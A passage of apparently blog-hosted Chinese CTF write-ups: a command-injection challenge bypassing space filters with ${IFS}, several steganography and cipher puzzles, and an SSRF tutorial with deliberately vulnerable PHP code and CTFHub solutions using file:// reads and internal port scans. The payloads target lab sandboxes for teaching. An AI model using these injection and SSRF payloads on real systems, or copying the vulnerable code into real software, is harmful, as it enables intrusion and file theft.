src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzVlYzJjODFhOTU4ZTgxZjdlMDllYzBmOTJjYWEwMDZfb3VoUVJlNUZOMk9id3FLaTMwd0N5SXowWHpMWmtlSHBfVG9rZW46VHN2TGJrZTY5b1I0aHB4Tnl2dWMxeFF4bm1kXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;9f3c5d77-202b-432a-b268-741ba25925bb&#125;</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-babyrce"><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h2><p>打开后</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0N2Y2NjRjZjNlOGM2MjQ1Zjk1MzE3ZDY4N2ExZTNfS0ZhalZDQ0huV3RYWm1vZnlST0IwbjZEWTBNWHBkRkxfVG9rZW46Tk4zRGI1RVhrb3N1YkZ4aGJaOWNxdFJWblpnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>我们先分析一下这段php代码</p><p>最后检查是否存在名为<code>admin</code>的<code>cookie</code>且值等于1，若满足，包含上级目录中的<code>“nest.php”</code>文件；若不满足，<code>显示小饼干最好吃了</code></p><p>从提示中我们已经知道这是有关<code>空格绕过</code>，<code>RCE</code>，<code>cookie注入</code></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MWU1NTM3MjJmNTZiZTMzMzhmZmRlMjBiODBjMmRjYTJfSmRNbW8zV1puOHVTRUlBMU8wNkFnRUlGYWsySVlod2VfVG9rZW46SHA4RGJtcFFob0xCYXF4ODhwZ2NOcEhCbmZkXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>设置cookie后 得到上图，接下来我们访问<code>rasalghul.php</code></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGZmNWIxZTliNmM5ZWE2M2QwMGNiYjViOGFlMzAyYjVfclhCRHNrTTRDczNvcG9rckxkdkRGNHNkZDV5ZjE3RzBfVG9rZW46WnAybmJhRjdxbzR1R2J4cjN3dWNxTW5tblJmXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>显然这是过滤了空格</p><p>我们构造<code>url=ls$&#123;IFS&#125;/</code></p><p>访问，查看根目录</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTgyYTFlZjdmYjJlMmRjZDRiZjE1MzFjZjIxZjczMWVfaTR1SGdwbmZkYWhxY0lBRHZ0NGxoV1k5dHo4Z0I2QVlfVG9rZW46RXkxaWJPaVlqbzNIQlV4UkU3QmNtNVI3bnRnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>如上图，得到了flag的名，直接进行访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:27319/rasalghul.php``?url=cat$&#123;IFS&#125;/flllllaaaaaaggggggg</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTcwNjRlODU0NTA5ODgzMWU5ZjUyNDkxMTdiY2MyZWNfa2Fhb0wwdHNpWHoxRHptcWcyVUtHNWpqNEMwUFY2N3hfVG9rZW46R056UWJRbmZCb0NXZWt4R3ZzemMzdEZ3bjZiXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>得到flag<code>NSSCTF&#123;69fbcd69-1f5a-4a48-9e6d-b77c43617710&#125;</code></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="SWPU-2020-耗子尾汁"><a href="#SWPU-2020-耗子尾汁" class="headerlink" title="[SWPU 2020]耗子尾汁"></a>[SWPU 2020]耗子尾汁</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MmRiODEwY2Q4YTQyODdlNjkwZThkODQ3N2FhYTlhMzdfblRaMmhXWnBiN1dpMkpQUDdOdDBCY3lXSWJJVlU2YW9fVG9rZW46RnJ3bmJCMWdSb1hscDd4YWZVbmNKM0lLbm9jXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>显然这是一个gif动图，我们先放进里面看一看有什么隐藏的东西</p><p>发现里面有隐藏的两个压缩文件，抽离出来，发现一个mp4和假的flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjRiNGMyZmJjMTM5NGY5MTI2MmI0OWMwNmI4ZTUyODlfTE1LZWp0ZzB6aEdocEM0VzV4VmhwZkEyZ2R2VkdYNFdfVG9rZW46UnVsRGJjczc2b0cwc0F4MHZuNWNKZGZTblVnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MmUwNzMxOGMzOWExZWFhOTJjMWQxNzM2N2IzNWJiOWJfd2xNbVBGVVlPeGRTdEJ0NndmYlFBVzhSb2dSTXVCWlNfVG9rZW46RUhCamJYbGxZbzdMakN4WHB6T2NOZTVnblVkXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY1ZjMyMWY1NzMxZDZkZGQ1MDMyNmY1YzE2MjNkNWJfVUhQOHVNZEVKcVlZOEtlcjV0akN0SldwbEFpWXVXN3NfVG9rZW46VUFMdGJDaUdTb1dGVWh4aU13R2NncWdLbnZlXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>在mp4文件中我们看到了一闪而过的一个什么东西，我们调一下倍速，好不容易截到的图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NGU3NDlkNGQzMzRmNGQ4YzI0YzMwOTEzZjI4MDg2YzZfbWp6OHo4aU5PekNJVTVWcnIxNEZBcXVYaVZ2cFB4S2hfVG9rZW46S29zN2JmWlJrb0Fubnh4SmREcWNoVEh2bmNnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>直接利用赛博厨子</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzI1ZGNmOTVkY2U2OGNiOGUyNTM0MDQzMGQxMzc2YjFfcjAxTTczMGNKWTRTbDBBSkMwekRhSnd6WHoxT1JaNEdfVG9rZW46QW5ma2JsRFFIb3NFVzF4eU5JUGN5MHNJbnZlXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>我们继续将MP4文件放进010，发现里面还有一个压缩文件</p><p>我们把它抽离出来，解压，发现需要密码，我们上面得到<code>sign_in</code></p><p>这个可能是解压的密码，输入进去确实是这样</p><p>里面是一下文本</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Njc0MmNiYzUyMWMwNzUyZDE3ZTA5ZTBlZTcyYTY1YjJfNUllNnJPYVJmclVPUmRZZWtEeWpac1ZONFdoUzVwUTJfVG9rZW46VlV6SmJWcnRpb092Wnl4cHdwQmNrM0RkbjllXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0=</span><br></pre></td></tr></table></figure><p>下面那句话是什么意思-最后一层是单表替换密码</p><p>我们先利用赛博厨子</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTg2OGYyYzQwNTZjMTQ4MjIzMjU0YTYwZDZmYmEwN2ZfWEU2dlNwNzE4VENjMGxhRTAzbE9PVWcxbHIySGsxN0VfVG9rZW46SEdXemJjOE9Ob2x2bGh4YTQ3MGNIZjIybnZnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvueiakxudsyqehszqhykggsyylkvvi</span><br></pre></td></tr></table></figure><p>搜了一下网上的wp，说的是仿射密码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ODdlMzg1OWY4ZjhjYjAwODQ4M2EzM2ZkOTI5ZTdkZDBfWDdvUVZ2eUpuNzVvdUlJcURWM0pvWktVUFd0SkpzM1JfVG9rZW46RUdNN2I3bzNybzlQekl4Mmthc2NseW5MbnVjXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>涉及文件名中19，20，跑一个仿射密码的脚本</p><p>暂时无法在飞书文档外展示此内容</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGMwZDNhNjlmYTgyNDA1MjJkNDJiMzVjZDIwYzhiOGZfU1dVNE5COTBwcElkNjlaNmNPekV1OWxibnkzYk5zMXpfVG9rZW46WnI5dmJEQVBKb01MYTZ4RjUwSmNXcWFBblRkXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;you_have_signed_in_successfully&#125;</span><br></pre></td></tr></table></figure><p>这道题也可以直接利用<code>quipquip</code>，直接搜索就好</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWY3MDRlYWY4Nzk4YmQ3ZDc3YzYyY2UwY2JjNTNiZTlfRlI1TVdwbnl5bkg4NTBRblFiZXZjQjlrZWFEVk9ScUxfVG9rZW46U1FzemJTcXdzbzJidk14Slc4TmNnZVllbndjXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>直接获得flag的格式，加上下划线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag you paresigned in successfully</span><br></pre></td></tr></table></figure><h2 id="GDOUCTF-2023-pixelart"><a href="#GDOUCTF-2023-pixelart" class="headerlink" title="GDOUCTF 2023]pixelart"></a>GDOUCTF 2023]pixelart</h2><p>打开后是这样的一幅图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjlkMDg4N2Q4M2ViYWFlYjYxOTMwZTJmMTA3NDAwZWJfS0NzSElrcVFTMWJKMEp3dTFGdFl4aDA5MXhDSkc5YmxfVG9rZW46TFNTQWJnWEdjb1VXcmh4MDBVQ2NBMFVXbktnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>这样并没有看出来什么东西，依旧按照常规思路，放进010中查看</p><p>我们在最后发现</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY4ZWRkMDJmN2ViNTc5ZWYzYTk0YzQ2YzdiZDkwY2RfOFdPRzdsZHV6U3dKUzk4ZW9vN09Ya0pMWjAyeTlOek5fVG9rZW46SFo2YWJhZDBab2JvMUp4VUNMNmNkWWVUblRjXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>这可能是要让我们修改一下长宽，我们先看一下图片属性</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTE3NDc0MjYyYWMyNTJhYWE2ZDQ3YWE0MWZmOTE2MWJfQU9Sb1JOMkE5WkRqMnJnSzFvWU5UbjVzcFc3Z21takJfVG9rZW46WlBabmJUa1Nab1ZNc2l4UHpLM2NjdXhYbks3XzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>正好是12倍的关系</p><p>那我们给他改一下</p><p>我们利用脚本来改</p><p>暂时无法在飞书文档外展示此内容</p><p>就得到了一个新的图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=N2U4MzA4MDEyYTMyNWRiOWM0MjEwMzFjMjlhY2MzZDBfbDBsMm5OTUIzRnFaS3ZHcnRFREFObUZpWHpBNjdYSzFfVG9rZW46WTFnN2JxM0gwbzBCMnV4TVRIaGMwTzJnblBnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>但是这个是假的</p><p>我们继续将这张图放进010中，看到了里面的</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OWNhM2ZkMTFkNjg0OThkMmU5ZWIxOGVjODkyZDQyMzVfTDNzcmRSOWVRWTBPRkZrajZoZmlLM1J2VUNPZDZYZXBfVG9rZW46SjA3MWJiUERab0pzV3B4WUlESWM4eUFIbmJoXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>可能是lsb，我们利用stegsolve来解决</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmFlYzNjODdkMDJlMmEzYmNlMzcxNDBiYTg2NzU2NDRfMkpuTWFRaHRJc2t0Tkhhd2JoU2xIOEo4UkRjeko0bmJfVG9rZW46VVFQaWJiVkJjb0NGUkt4V2FwZWN4UkZRbk9mXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDcyMjUxYjlhNDUzNTc1NmY2ZWJlYjA0YzkyZWI2NTFfV2tWTkEwYVdwT1NuU05NTXpYWnhCZGhhSlBDaFBtRGlfVG9rZW46SkRoM2JGS0Fjb25zd014NzlVWGM1VWhKbm9iXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>看到了这个，就找到了我们需要的flag，再进行修改（需要把里面的空格删去)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;J3st_2_cats_battling&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week3-web-SSRF</title>
      <link href="/2025/04/28/week3-web-SSRF/"/>
      <url>/2025/04/28/week3-web-SSRF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTZmZjdkMWE5YTc3M2FmNmViNDkxODdhNjA2YmNmNzJfR2F1dktPa0g0S0s4NFhBaGxwMTlJNHpVaG5BS0Eya1RfVG9rZW46QllrUWJEOGRLb3hGZTh4Q29YWGNnSjFnbnJnXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>上面是大概的整个框架，咱们一个一个来</p><h1 id="SSRF漏洞介绍及原理"><a href="#SSRF漏洞介绍及原理" class="headerlink" title="SSRF漏洞介绍及原理"></a>SSRF漏洞介绍及原理</h1><p>主要由攻击者构造请求，由服务端发起请求的安全漏洞，差不多就是信息泄露漏洞。攻击的目标是外网无法访问的内部系统。</p><p>形成是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h1 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h1><ul><li>对外网，服务器所在内网，本地进行端口扫描，获取一些服务的banner信息</li><li>攻击运行在内网或本地的应用程序。</li><li>攻击内外网的web应用，使用http get请求就可以实现</li><li>利用file协议读取本地文件</li></ul><h1 id="漏洞产生的相关函数："><a href="#漏洞产生的相关函数：" class="headerlink" title="漏洞产生的相关函数："></a>漏洞产生的相关函数：</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><code>file_get_contents()</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];;  <span class="comment">#从URL参数中获取名url的值，并将其赋给变量$url,同时就意味着攻击者可通过修改URL直接控制这个变量</span></span><br><span class="line">echo file_get_contents($url);   <span class="comment">#使用file_get_contents()函数读取由$url指定的内容，并通过echo输出到页面上。</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。</p><p>这个函数把一个字符串写入文件中</p><h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a><code>fsockopen()</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) &#123; </span><br><span class="line">    <span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);  </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>;    <span class="comment">#检查是否连接成功，若上述返回false，则输出错误信息并结束执行。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); &#125;</span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$contents</span>;  <span class="comment">#fgets()函数逐行读取服务器返回的数据，并且读取的内容被追加到变量$contents中，最后，关闭socket连接并返回收集的所有数据。 </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个函数实现对用户指定url数据的获取，使用socket连接，使用fsockopen()函数尝试与远端服务器建立TCP&#x2F;IP连接。若连接成功，返回一个资源标识符；反之返回false。</p><p><code> host</code>是主机名，<code>port</code>是端口，<code>errstr</code>表示错误信息将以字符串的信息返回，且以30为时限</p><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><code>curl_exec()</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_init();  <span class="comment"># 创建新的 cURL 资源</span></span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, 0);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, 1);   <span class="comment">#设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);# 抓取 URL 并把它传递给浏览器</span><br><span class="line">    curl_close(<span class="variable">$curlobj</span>);# 关闭 cURL 资源，并且释放系统资源</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个函数用于执行指定的cURL会话</p><h3 id="注意！！"><a href="#注意！！" class="headerlink" title="注意！！"></a>注意！！</h3><ol><li>一般情况下PHP不会开启fopen的gopher wrapper</li><li>file_get_contents的gopher协议不能URL编码</li><li>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</li><li>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</li><li>curl_exec() &#x2F;&#x2F;默认不跟踪跳转</li><li>file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议</li></ol><h1 id="看一些相关例题"><a href="#看一些相关例题" class="headerlink" title="看一些相关例题"></a>看一些相关例题</h1><h2 id="CTFHUB-内网访问"><a href="#CTFHUB-内网访问" class="headerlink" title="CTFHUB-内网访问"></a>CTFHUB-内网访问</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDk3OTIwZDU1NTRjYzlkNmM4NTY1NmUwYmZjYmM5MWFfbk1QNkozTVRsVGltakZnVzRSODFpbGJscjlDS2JlMElfVG9rZW46QjdrUGI4V2Fyb1BIczN4NmlxdWNUbDRlblQ3XzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>图中包含关键信息 尝试访问位于127.0.0.1的flag.php</p><p>已经提示要访问的内网地址，并且输入进去回车一下并没有被挡住</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-37f9ce83319ff7da.sandbox.ctfhub.com:10800/?url=``127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>如上图，得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDdlMTFlYzZlYmM5Y2U3OWM3MmE4YzczMGM1ZTQzOTdfZlFWY3pZOU1MMVFvMDdmN25yS3ltNU1mVTZmTkN3TEhfVG9rZW46QlVXUmJ6b0tlb2pENEJ4WWVqS2NHNkMwbnNoXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;c73c88945792dbcb94a739d9&#125;</span><br></pre></td></tr></table></figure><h2 id="CTFHUB-伪协议读取文件"><a href="#CTFHUB-伪协议读取文件" class="headerlink" title="CTFHUB-伪协议读取文件"></a>CTFHUB-伪协议读取文件</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NGNiZjE4YjM3ODdjMjBlYzZiMTI4NjkxZDMwOGE4OTFfeUlmOUFlSzhWZFRqenM3VEZSSXl5NWlnVzYxYm02Y1hfVG9rZW46TEk2amJjU2FWb2swajd4VkxrMGNjalhnbkFlXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>根据给出的提示，读取web目录下的flag.php,所以我们应该知道web目录地址，通常情况下是在<code>/var/www/html/</code></p><p>还有一个知识预备：</p><p>file:&#x2F;&#x2F;     -访问本地文件系统</p><p>http:&#x2F;&#x2F;    -访问http(s)网址</p><p>…….</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-aad86e53e0aa9832.sandbox.ctfhub.com:10800/?``url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQ2OThkNzI0ZWVlMTFiNDNjNTViY2E0NDQ2Mzc3MTdfUG5kbUVCUlYxbHE4ejd2U1JmNHlteGNReUlUNnp0enVfVG9rZW46WTY5MWJ3dzNTb29mckV4Sm1oZGNTazFobldjXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>查看源码后获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;381b765b9f4b42b05d4ff235&#125;</span><br></pre></td></tr></table></figure><h2 id="CTFHUB-端口扫描"><a href="#CTFHUB-端口扫描" class="headerlink" title="CTFHUB-端口扫描"></a>CTFHUB-端口扫描</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDk0YTAxMjA1ZGZmODhjNmVmMDZmNmU3MGJkNGUwMjdfOWxWMlJCejgwU2xDbGoxNHFWenBGdHl5Ykd3ckZkMG9fVG9rZW46TnFMeGJSVEx0b0I1bmN4bjFFM2NoanRkbmFiXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><h3 id="解法一：利用Burp"><a href="#解法一：利用Burp" class="headerlink" title="解法一：利用Burp"></a>解法一：利用Burp</h3><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTAyYWFjMjY4YTQ1YjdkMGExN2NmZmI5MDRkOTVmY2JfcVVCVnBuRDRmbE5DMWJlUzFHdWVZbjRXMENIR0lHbTBfVG9rZW46TlEyVGJCQTFPbzRrZ0F4Z3J0SGNGN3RZbldkXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjE2Y2ZlNjgyY2M2N2RlMjZjNmE2ZWIwNWY2NTZjM2NfZHhpYTV1c2ROTnRiOEx5TmcyNDl4cmdDTlJBaTE4TjdfVG9rZW46U2V1MmJBZ2Q5b3JVTEF4dzVoNGNNVkZUbm1jXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTA0MzJiYzZlMjk4YTdmNDgyMGY0YzUyMWM2NDhmMmVfVWx2ZElXREhMZFFiOG5URTVaVVRoaWlHTmp3QUF5YlpfVG9rZW46SG5RWWJFVHFrb05tMXJ4WG50TmNRYXE5blJoXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>开始攻击</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTg2NmYxZTkxNzE4ZWZmZjhkOTJmMTI3ZmI1YjM2YTdfZFIyVUh3aWJCanpwWFU3NEZidU4yY2ZiYUFIRmtQRkNfVG9rZW46SHR3NWJrTUw3b1JpMGd4V0hRT2MzYmJzbjdmXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>找到长度不同对应的端口，8468</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-278b9ef55b2c3682.sandbox.ctfhub.com:10800/``?url=127.0.0.1:8468</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDZiMzhkOWIwMjcxZGY0MjYxOGJiMWViMTY5NGI5Yjhfd2hEdFh0R0M1bHdRMm5xYThhT2VOUmdkS0ZmZ3RNQ2JfVG9rZW46TzNxM2JNcFZNb016TFB4amdETWM0MTNobnhkXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><h3 id="解法二：利用脚本"><a href="#解法二：利用脚本" class="headerlink" title="解法二：利用脚本"></a>解法二：利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  